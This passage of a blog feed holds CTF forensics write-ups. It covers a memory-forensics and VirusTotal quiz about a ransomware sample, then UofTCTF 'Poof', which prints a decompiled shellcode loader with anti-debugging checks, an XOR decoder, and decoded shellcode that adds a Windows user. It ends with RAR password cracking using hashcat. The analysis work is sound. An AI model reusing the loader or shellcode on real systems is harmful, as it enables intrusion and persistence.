plugin, so the answer was ch2.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">From which directory does process 6444 come from? Give only the local path with directory name (NOT the absolute path, i.e. without Desktop, e.g. mydirectory)</span><br><span class="line">ch2</span><br><span class="line">Correct!</span><br><span class="line">What is the filename of the process which executed the two malware with PID 4680? Give only the filename with extension (e.g. myfile.ext)</span><br></pre></td></tr></table></figure><p>Step 17: Getting the filename of the process</p><p>Since the above output had the executable with a long string name, which was also mentioned in the PID 1236 process, I checked that and it turned out to be the desired one.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">What is the filename of the process which executed the two malware with PID 4680? Give only the filename with extension (e.g. myfile.ext)</span><br><span class="line">0002bdf0923262600d3ef66d1ec6b2396a434e6f7626a9d70241a5663ee2f736.exe</span><br><span class="line">Correct!</span><br><span class="line">Congratulations! You have completed the quiz.</span><br><span class="line">Here&#x27;s your flag for challenge DFIR_3_RAMsomwhere: srdnlen&#123;DFIR3:Windows_RAMsomware&#125;</span><br></pre></td></tr></table></figure><p>Hooray I got our flag.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">srdnlen&#123;DFIR3:Windows_RAMsomware&#125;</span></span><br></pre></td></tr></table></figure><h3 id="DFIR-4-MalThrInt"><a href="#DFIR-4-MalThrInt" class="headerlink" title="DFIR 4 - MalThrInt"></a>DFIR 4 - MalThrInt</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>We have been notified of an attack in one of our machines. This is a real forensics investigation and you have to retrieve Threat Intelligence data from VirusTotal using the last answered hash of DFIR-3-RAMsomwhere and answer to the related questions. At the end you will get the flag when you answer everything correct.</p><p>NOTE: This is a real malware. Do not execute nothing. Pay attention and be careful. Srdnlen denies every damage on your infrastructure.</p><p>This is a remote challenge, you can connect to the service with: <code>nc dfir4.challs.srdnlen.it 1987</code><br>Author: slsanna</p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>This challenge required retrieving Threat Intelligence data from VirusTotal using the last answered hash from DFIR-3-RAMsomwhere.</p><p>First, search for the hash <code>0002bdf0923262600d3ef66d1ec6b2396a434e6f7626a9d70241a5663ee2f736</code> on the VirusTotal website to gather the necessary information. Then, start interacting with the provided nc instance.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc dfir4.challs.srdnlen.it 1987</span><br><span class="line"></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"><span class="comment">#   Welcome to DFIR.4 MalThrInt Challenge!   #</span></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"></span><br><span class="line">In this challenge, you have to retrieve information from VirusTotal using the <span class="built_in">hash</span> correctly answered <span class="keyword">in</span> the last question of DFIR.3-RAMsomwhere </span><br><span class="line">You will answer a series of questions.</span><br><span class="line">Each correct answer will take you closer to the flag srdnlen&#123;something&#125;</span><br><span class="line">Good luck!</span><br><span class="line"></span><br><span class="line">What is the VT detection score?</span><br></pre></td></tr></table></figure><p>Step 1: VT Detection Score<br>The currently VirusTotal detection score is 65&#x2F;72. While it may change over time, the correct answer here is 62&#x2F;72. If you face issues, you can attempt a brute-force approach by testing nearby values.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the VT detection score?</span><br><span class="line">62/72</span><br><span class="line">Correct!</span><br><span class="line">Give the popular threat label</span><br></pre></td></tr></table></figure><p>Step 2: Popular Threat Label<br>Navigate to the Detection page under the Dynamic Analysis Sandbox Detections section. The correct answer is:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Give the popular threat label</span><br><span class="line">virus.virlock/polyransom</span><br><span class="line">Correct!</span><br><span class="line">What is the target machine?</span><br></pre></td></tr></table></figure><p>Step 3: Target Machine<br>On the Details page, scroll down to find the target machine information. The answer is:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the target machine?</span><br><span class="line">Intel 386</span><br><span class="line">Correct!</span><br><span class="line">Which dlls are used? Give just the name without .dll extension. If more than one put a comma (e.g. 1, 2)</span><br></pre></td></tr></table></figure><p>I got tricked by this question. At first, I tried using the DLLs mentioned in the Files Opened and Runtime Modules sections, but there were many, and I failed to find the correct ones. Then, I checked the Imports section on the Details page, where I found two DLL modules. After trying those, I got the desired result.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Which dlls are used? Give just the name without .dll extension. If more than one put a comma (e.g. 1, 2)</span><br><span class="line">kernel32, user32</span><br><span class="line">Correct!</span><br><span class="line">What is the malicious IP address?</span><br></pre></td></tr></table></figure><p>Step 5: Malicious IP Address<br>On the Relations page, look under the Contacted IP addresses section. 1 IP is detected and got the desired result:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the malicious IP address?</span><br><span class="line">144.76.195.253</span><br><span class="line">Correct!</span><br><span class="line">What is the registrar of the domain related to the previous bitcoin address?</span><br></pre></td></tr></table></figure><p>Step 6: Registrar of the Domain<br>Under the Contacted Domains section, identify the domain related to the previous Bitcoin address.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">What is the registrar of the domain related to the previous bitcoin address?</span><br><span class="line">Hetzner Online GmbH</span><br><span class="line">Which persistence techniques according to MITRE does it have? If more than one put a comma (e.g. 1, 2)</span><br></pre></td></tr></table></figure><p>Step 7: MITRE Persistence Techniques<br>On the Behavior page, check the MITRE ATT&amp;CK Tactics and Techniques section. Similarly you will get the answer for the Step - 8, 9, 10.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Which persistence techniques according to MITRE does it have? If more than one put a comma (e.g. 1, 2)</span><br><span class="line">T1053, T1542, T1542.003, T1547, T1547.001, T1574, T1574.002</span><br><span class="line">Correct!</span><br><span class="line">Which defence/evasion techniques according to MITRE does it have? If more than one put a comma (e.g. 1, 2)</span><br><span class="line">T1014, T1027, T1027.002, T1036, T1055, T1112, T1202, T1497, T1542, T1542.003, T1548, T1548.002, T1562, T1562.001, T1562.006, T1564, T1564.001, T1574, T1574.002</span><br><span class="line">Correct!</span><br><span class="line">Which anti-behavioral analysis techniques according to MITRE does it have? If more than one put a comma (e.g. 1, 2)</span><br><span class="line">B0007, B0007.008, F0001</span><br><span class="line">Correct!</span><br><span class="line">Which anti-static analysis technique according to MITRE does it have?</span><br><span class="line">F0001</span><br><span class="line">Correct!</span><br><span class="line">Congratulations! You have completed the quiz.</span><br><span class="line">Here&#x27;s your flag for challenge DIR_4_MalThrInt: srdnlen&#123;DFIR4:VirusTotal4PPID_ThreatIntelligence&#125;</span><br></pre></td></tr></table></figure><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">srdnlen&#123;DFIR4:VirusTotal4PPID_ThreatIntelligence&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;I participated in Srdnlen CTF 2025, as a member of my institute’s club, InfoSecIITR. This writeup details the challenges of the forensics</summary>
      
    
    
    
    <category term="CTF-Writeups" scheme="https://g4rud4kun.github.io/categories/CTF-Writeups/"/>
    
    
    <category term="forensics" scheme="https://g4rud4kun.github.io/tags/forensics/"/>
    
    <category term="volatility" scheme="https://g4rud4kun.github.io/tags/volatility/"/>
    
    <category term="misc" scheme="https://g4rud4kun.github.io/tags/misc/"/>
    
    <category term="VirusTotal" scheme="https://g4rud4kun.github.io/tags/VirusTotal/"/>
    
    <category term="evtx" scheme="https://g4rud4kun.github.io/tags/evtx/"/>
    
  </entry>
  
  <entry>
    <title>UofTCTF 2025</title>
    <link href="https://g4rud4kun.github.io/2025/01/18/UofTCTF-2025/"/>
    <id>https://g4rud4kun.github.io/2025/01/18/UofTCTF-2025/</id>
    <published>2025-01-18T05:36:42.000Z</published>
    <updated>2025-05-18T11:32:07.649Z</updated>
    
    <content type="html"><![CDATA[<p>UofTCTF 2025!</p><p>I participated in UofTCTF 2025, organized by the University of Toronto Capture the Flag team, as a member of my institute’s club, InfoSecIITR. These writeups cover the Miscellaneous, Web and Forensics challenges that I personally solved during the competition.</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Poof"><a href="#Poof" class="headerlink" title="Poof"></a>Poof</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Yet another pcap, no usb traffic in this one so I’m lost. Can you help me out? :)</p><p>Author: 0x157</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>This year, we only received one challenge from 0x157 because he was sick. We were given a poof.pcapng file for this challenge. My excitement from the previous pcap challenges, like Skat’s challenge in IrisCTF ‘25, hadn’t worn off yet.</p><p>This challenge was solved by my teammate during the competition while I was working on another one. I attempted this challenge later.</p><p>I began analyzing the pcapng file in Wireshark. First, I checked the Protocol Hierarchy Statistics, and this was the result:</p><p><img src="/images/posts/2025-uoftctf/forensics/poof/stats.png" alt="Stats"></p><p>Next, I examined the TCP packets and found this packet, which contained a listing of the files:</p><p><img src="/images/posts/2025-uoftctf/forensics/poof/list.png" alt="List of the files"></p><p>I proceeded to export all the files that were shared:</p><p><img src="/images/posts/2025-uoftctf/forensics/poof/export_obj.png" alt="Export Objects"></p><p>Only kcaswqcd.ps1 turned out to be useful, so I started analyzing it.</p><p>What This Script Does:</p><ol><li><p>Variable and Object Creation:</p><p> The script dynamically creates variables using Set-Variable and Set-Item.<br> It utilizes PowerShell’s -f string format operator to concatenate strings and obfuscate key values.</p></li><li><p>Decryption Logic:</p><p> The script initializes cryptographic objects (e.g., AES decryption) and sets up parameters such as keys, initialization vectors (IVs), cipher mode, and padding.<br> It reads encrypted content and decrypts it using the specified cryptographic parameters.</p></li><li><p>Memory Stream Operations:</p><p> The decrypted data is streamed through memory, likely preparing it for writing to a file.</p></li><li><p>File Creation:</p><p> The decrypted content is written to an executable file (.exe) in a temporary directory.</p></li><li><p>Execution:</p><p> The script invokes the newly created executable file using Start-Process.</p></li></ol><p>I extracted the useful part from the ps code:</p><p><img src="/images/posts/2025-uoftctf/forensics/poof/ps.png" alt="Powershell"></p><p>From this, we obtained the CV, IV, and KEY. Let’s decrypt it on CyberChef as we already had 82nvdkandf.bin:</p><p><img src="/images/posts/2025-uoftctf/forensics/poof/cyberchef.png" alt="Cyberchef"></p><p>After decrypting the file, I downloaded the PE file named poof.exe.</p><p>I initially attempted to analyze it using IDA and Ghidra but was unsuccessful. Then, I tried using dnSpy, which allowed me to view the desired code.</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Imports System</span><br><span class="line">Imports System.Diagnostics</span><br><span class="line">Imports System.Runtime.CompilerServices</span><br><span class="line">Imports System.Runtime.InteropServices</span><br><span class="line"></span><br><span class="line">Namespace Kljansdfkansdf</span><br><span class="line"><span class="string">&#x27; Token: 0x02000003 RID: 3</span></span><br><span class="line"><span class="string">&lt;NullableContext(1)&gt;</span></span><br><span class="line"><span class="string">&lt;Nullable(0)&gt;</span></span><br><span class="line"><span class="string">Public Class Kljansdfkansdf</span></span><br><span class="line"><span class="string">&#x27;</span> Token: <span class="number">0x06000009</span> RID: <span class="number">9</span> RVA: <span class="number">0x00002080</span> File Offset: <span class="number">0x00000280</span></span><br><span class="line"><span class="function">Public Shared Sub <span class="title">kjfadsiewqinfqniowf</span>(<span class="params">ncuasdhif As Byte(</span>))</span></span><br><span class="line"><span class="function">Dim num As UInteger</span> = Win32.VirtualAlloc(<span class="number">0U</span>I, CUInt(ncuasdhif.Length), Win32.MEM_COMMIT, Win32.PAGE_READWRITE)</span><br><span class="line">Marshal.Copy(ncuasdhif, <span class="number">0</span>, CType(CType(num, UIntPtr), IntPtr), ncuasdhif.Length)</span><br><span class="line">Dim num2 As UInteger</span><br><span class="line">Win32.VirtualProtect(CType(CType(num, UIntPtr), IntPtr), CType(CType(ncuasdhif.Length, IntPtr), UIntPtr), Win32.PAGE_EXECUTE_READ, num2)</span><br><span class="line">Dim zero As IntPtr = IntPtr.Zero</span><br><span class="line">Dim num3 As UInteger = <span class="number">0U</span>I</span><br><span class="line">Dim zero2 As IntPtr = IntPtr.Zero</span><br><span class="line">Win32.WaitForSingleObject(Win32.CreateThread(<span class="number">0U</span>I, <span class="number">0U</span>I, num, zero2, <span class="number">0U</span>I, num3), UInteger.MaxValue)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; Token: 0x0600000A RID: 10 RVA: 0x000020E4 File Offset: 0x000002E4</span></span><br><span class="line"><span class="string">Private Shared Sub Main(args As String())</span></span><br><span class="line"><span class="string">Win32.ShowWindow(Win32.GetConsoleWindow(), Win32.SW_HIDE)</span></span><br><span class="line"><span class="string">If Debugger.IsAttached Then</span></span><br><span class="line"><span class="string">Environment.[Exit](0)</span></span><br><span class="line"><span class="string">End If</span></span><br><span class="line"><span class="string">For Each process As Process In Process.GetProcesses()</span></span><br><span class="line"><span class="string">If process.ProcessName.Contains(&quot;devenv&quot;) OrElse process.ProcessName.Contains(&quot;dnspy&quot;) Then</span></span><br><span class="line"><span class="string">Environment.[Exit](0)</span></span><br><span class="line"><span class="string">End If</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string">Dim array As Byte() = New Byte() &#123; 129, 149, Byte.MaxValue, 125, 125, 125, 29, 244, 152, 76, 189, 25, 246, 45, 77, 246, 47, 113, 246, 47, 105, 246, 15, 85, 114, 202, 55, 91, 76, 130, 209, 65, 28, 1, 127, 81, 93, 188, 178, 112, 124, 186, 159, 143, 47, 42, 246, 47, 109, 246, 55, 65, 246, 49, 108, 5, 158, 53, 124, 172, 44, 246, 36, 93, 124, 174, 246, 52, 101, 158, 71, 52, 246, 73, 246, 124, 171, 76, 130, 209, 188, 178, 112, 124, 186, 69, 157, 8, 139, 126, 0, 133, 70, 0, 89, 8, 153, 37, 246, 37, 89, 124, 174, 27, 246, 113, 54, 246, 37, 97, 124, 174, 246, 121, 246, 124, 173, 244, 57, 89, 89, 38, 38, 28, 36, 39, 44, 130, 157, 34, 34, 39, 246, 111, 150, 240, 32, 23, 124, 240, 248, 207, 125, 125, 125, 45, 21, 76, 246, 18, 250, 130, 168, 198, 141, 200, 223, 43, 21, 219, 232, 192, 224, 130, 168, 65, 123, 1, 119, 253, 134, 157, 8, 120, 198, 58, 110, 15, 18, 23, 125, 46, 130, 168, 30, 16, 25, 93, 82, 30, 93, 19, 24, 9, 93, 8, 14, 24, 15, 93, 17, 24, 26, 20, 9, 8, 14, 24, 15, 93, 8, 18, 27, 9, 30, 9, 27, 6, 42, 73, 14, 34, 76, 41, 34, 47, 78, 28, 17, 17, 4, 34, 28, 51, 34, 52, 16, 13, 17, 73, 19, 9, 66, 66, 0, 93, 82, 28, 25, 25, 93, 82, 4, 125 &#125;</span></span><br><span class="line"><span class="string">Dim b As Byte = 125</span></span><br><span class="line"><span class="string">For j As Integer = 0 To array.Length - 1</span></span><br><span class="line"><span class="string">Dim array2 As Byte() = array</span></span><br><span class="line"><span class="string">Dim num As Integer = j</span></span><br><span class="line"><span class="string">array2(num) = array2(num) Xor b</span></span><br><span class="line"><span class="string">Next</span></span><br><span class="line"><span class="string">Kljansdfkansdf.kjfadsiewqinfqniowf(array)</span></span><br><span class="line"><span class="string">End Sub</span></span><br><span class="line"><span class="string">End Class</span></span><br><span class="line"><span class="string">End Namespace</span></span><br></pre></td></tr></table></figure><p>As you can see, it was performing an XOR operation, so I wrote a script to decode it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Given encrypted byte array</span></span><br><span class="line">encrypted_array = [</span><br><span class="line">    <span class="number">129</span>, <span class="number">149</span>, <span class="number">255</span>, <span class="number">125</span>, <span class="number">125</span>, <span class="number">125</span>, <span class="number">29</span>, <span class="number">244</span>, <span class="number">152</span>, <span class="number">76</span>, <span class="number">189</span>, <span class="number">25</span>, <span class="number">246</span>, <span class="number">45</span>, <span class="number">77</span>, <span class="number">246</span>, <span class="number">47</span>, <span class="number">113</span>, <span class="number">246</span>, <span class="number">47</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">246</span>, <span class="number">15</span>, <span class="number">85</span>, <span class="number">114</span>, <span class="number">202</span>, <span class="number">55</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">130</span>, <span class="number">209</span>, <span class="number">65</span>, <span class="number">28</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">81</span>, <span class="number">93</span>, <span class="number">188</span>, <span class="number">178</span>, <span class="number">112</span>, <span class="number">124</span>,</span><br><span class="line">    <span class="number">186</span>, <span class="number">159</span>, <span class="number">143</span>, <span class="number">47</span>, <span class="number">42</span>, <span class="number">246</span>, <span class="number">47</span>, <span class="number">109</span>, <span class="number">246</span>, <span class="number">55</span>, <span class="number">65</span>, <span class="number">246</span>, <span class="number">49</span>, <span class="number">108</span>, <span class="number">5</span>, <span class="number">158</span>, <span class="number">53</span>, <span class="number">124</span>, <span class="number">172</span>, <span class="number">44</span>, <span class="number">246</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">93</span>, <span class="number">124</span>, <span class="number">174</span>, <span class="number">246</span>, <span class="number">52</span>, <span class="number">101</span>, <span class="number">158</span>, <span class="number">71</span>, <span class="number">52</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">246</span>, <span class="number">124</span>, <span class="number">171</span>, <span class="number">76</span>, <span class="number">130</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">178</span>,</span><br><span class="line">    <span class="number">112</span>, <span class="number">124</span>, <span class="number">186</span>, <span class="number">69</span>, <span class="number">157</span>, <span class="number">8</span>, <span class="number">139</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">133</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">8</span>, <span class="number">153</span>, <span class="number">37</span>, <span class="number">246</span>, <span class="number">37</span>, <span class="number">89</span>, <span class="number">124</span>, <span class="number">174</span>, <span class="number">27</span>,</span><br><span class="line">    <span class="number">246</span>, <span class="number">113</span>, <span class="number">54</span>, <span class="number">246</span>, <span class="number">37</span>, <span class="number">97</span>, <span class="number">124</span>, <span class="number">174</span>, <span class="number">246</span>, <span class="number">121</span>, <span class="number">246</span>, <span class="number">124</span>, <span class="number">173</span>, <span class="number">244</span>, <span class="number">57</span>, <span class="number">89</span>, <span class="number">89</span>, <span class="number">38</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">36</span>,</span><br><span class="line">    <span class="number">39</span>, <span class="number">44</span>, <span class="number">130</span>, <span class="number">157</span>, <span class="number">34</span>, <span class="number">34</span>, <span class="number">39</span>, <span class="number">246</span>, <span class="number">111</span>, <span class="number">150</span>, <span class="number">240</span>, <span class="number">32</span>, <span class="number">23</span>, <span class="number">124</span>, <span class="number">240</span>, <span class="number">248</span>, <span class="number">207</span>, <span class="number">125</span>, <span class="number">125</span>, <span class="number">125</span>, <span class="number">45</span>,</span><br><span class="line">    <span class="number">21</span>, <span class="number">76</span>, <span class="number">246</span>, <span class="number">18</span>, <span class="number">250</span>, <span class="number">130</span>, <span class="number">168</span>, <span class="number">198</span>, <span class="number">141</span>, <span class="number">200</span>, <span class="number">223</span>, <span class="number">43</span>, <span class="number">21</span>, <span class="number">219</span>, <span class="number">232</span>, <span class="number">192</span>, <span class="number">224</span>, <span class="number">130</span>, <span class="number">168</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">123</span>, <span class="number">1</span>, <span class="number">119</span>, <span class="number">253</span>, <span class="number">134</span>, <span class="number">157</span>, <span class="number">8</span>, <span class="number">120</span>, <span class="number">198</span>, <span class="number">58</span>, <span class="number">110</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">23</span>, <span class="number">125</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">168</span>, <span class="number">30</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">93</span>,</span><br><span class="line">    <span class="number">82</span>, <span class="number">30</span>, <span class="number">93</span>, <span class="number">19</span>, <span class="number">24</span>, <span class="number">9</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">17</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">9</span>,</span><br><span class="line">    <span class="number">30</span>, <span class="number">9</span>, <span class="number">27</span>, <span class="number">6</span>, <span class="number">42</span>, <span class="number">73</span>, <span class="number">14</span>, <span class="number">34</span>, <span class="number">76</span>, <span class="number">41</span>, <span class="number">34</span>, <span class="number">47</span>, <span class="number">78</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">17</span>, <span class="number">4</span>, <span class="number">34</span>, <span class="number">28</span>, <span class="number">51</span>, <span class="number">34</span>, <span class="number">52</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">17</span>,</span><br><span class="line">    <span class="number">73</span>, <span class="number">19</span>, <span class="number">9</span>, <span class="number">66</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">82</span>, <span class="number">28</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">93</span>, <span class="number">82</span>, <span class="number">4</span>, <span class="number">125</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># XOR key</span></span><br><span class="line">key = <span class="number">125</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the payload using XOR</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="keyword">return</span> [byte ^ key <span class="keyword">for</span> byte <span class="keyword">in</span> data]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the array</span></span><br><span class="line">decrypted_array = xor_decrypt(encrypted_array, key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert to bytes for further analysis</span></span><br><span class="line">decrypted_bytes = <span class="built_in">bytes</span>(decrypted_array)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_bytes)</span><br></pre></td></tr></table></figure><p>I ran the script and obtained the following output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 decode.py</span><br><span class="line">b<span class="string">&#x27;\xfc\xe8\x82\x00\x00\x00`\x89\xe51\xc0d\x8bP0\x8bR\x0c\x8bR\x14\x8br(\x0f\xb7J&amp;1\xff\xac&lt;a|\x02, \xc1\xcf\r\x01\xc7\xe2\xf2RW\x8bR\x10\x8bJ&lt;\x8bL\x11x\xe3H\x01\xd1Q\x8bY \x01\xd3\x8bI\x18\xe3:I\x8b4\x8b\x01\xd61\xff\xac\xc1\xcf\r\x01\xc78\xe0u\xf6\x03&#125;\xf8;&#125;$u\xe4X\x8bX$\x01\xd3f\x8b\x0cK\x8bX\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89D$$[[aYZQ\xff\xe0__Z\x8b\x12\xeb\x8d]j\x01\x8d\x85\xb2\x00\x00\x00Ph1\x8bo\x87\xff\xd5\xbb\xf0\xb5\xa2Vh\xa6\x95\xbd\x9d\xff\xd5&lt;\x06|\n\x80\xfb\xe0u\x05\xbbG\x13roj\x00S\xff\xd5cmd /c net user legituser uoftctf&#123;W4s_1T_R3ally_aN_Impl4nt??&#125; /add /y\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>We got our flag!</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">uoftctf&#123;W4s_1T_R3ally_aN_Impl4nt??&#125;</span> </span><br></pre></td></tr></table></figure><h3 id="Decrypt-Me"><a href="#Decrypt-Me" class="headerlink" title="Decrypt Me"></a>Decrypt Me</h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>I encrypted my encryption script, but I forgot the password. Can you help me decrypt it?</p><p>Author: SteakEnthusiast</p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>In this challenge, we received a password-protected RAR file using version 5.</p><p>I examined the file’s hex using the bvi hex editor and noticed that it contained flag.py and another file, flag.enc, stored as Alternate Data Streams (ADS), as shown below:</p><p><img src="/images/posts/2025-uoftctf/forensics/dm/hex.png" alt="Hex Data"></p><p>As expected, we needed to brute-force the password using Hashcat with a dictionary attack. To start, we needed the hash for the password of the file, so I used John the Ripper’s tool rar2john:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./rar2john flag.rar &gt; hash_rar.txt</span><br></pre></td></tr></table></figure><p>For brute-forcing with Hashcat, we need to remove everything before the colon in the output. The remaining content of hash_rar.txt was:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$280234db9d29c6ab216b74e6a89ec226$8$d12d4ba211b9c642</span><br><span class="line">$rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$7d06143b1a7dab3327b3ef1e41ad881a$8$d12d4ba211b9c642</span><br></pre></td></tr></table></figure><p>Since flag.rar contained two files, we ended up with two hashes. Hashcat would first brute-force the first hash, and then proceed with the second one.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 13000 -a 0 -w 4 hash_rar.txt ~/Downloads/rockyou.txt </span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">[s]tatus [p]ause [b]ypass 